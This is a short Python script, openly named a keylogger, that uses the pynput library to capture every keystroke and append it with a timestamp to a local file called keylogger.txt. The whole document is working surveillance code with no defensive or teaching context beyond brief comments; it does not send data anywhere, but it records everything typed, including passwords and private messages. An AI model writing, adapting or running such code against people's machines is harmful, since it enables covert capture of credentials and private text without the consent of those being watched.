from pynput import keyboard
import datetime

# Define function for pressing a key
def press(key):
    print(str(key))
   
    # Make a text file and give it a variable
    # Make it do something as you type
    with open("keylogger.txt", 'a') as keylog:
        try:
            date = datetime.datetime.now()
            dt = date.strftime("%m/%d/%Y %I:%M:%S %p")
            k = str(key)
            keylog.write(dt) + keylog.write(" - ") + keylog.write(k) + keylog.write("\n")
        
        except:
            return False
 
# Let the keyboard record keystrokes
if __name__ == "__main__":
    listener = keyboard.Listener(on_press = press)
    listener.start()
    input()

    # End of code
